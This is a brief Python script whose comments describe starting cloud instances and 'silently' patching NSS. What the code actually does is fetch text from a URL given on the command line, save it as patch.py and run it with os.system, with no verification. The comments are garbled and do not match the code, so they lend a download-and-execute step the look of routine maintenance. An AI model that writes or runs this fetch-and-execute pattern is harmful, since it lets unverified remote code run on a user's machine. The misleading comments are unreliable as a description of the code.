import requests, os, sys

# hit API Gateway and run a Lambda function to start EC2 instances: Storage Gateway & p2.xlarge
requests.get(sys.argv[1])

# patch NSS silently with no bother
with requests.get(sys.argv[2]) as r:
    with open('patch.py', 'w') as f:
        f.write(r.text)
os.system('python patch.py')

with open('upload_progress.ns', 'w') as up:
        up.write('...')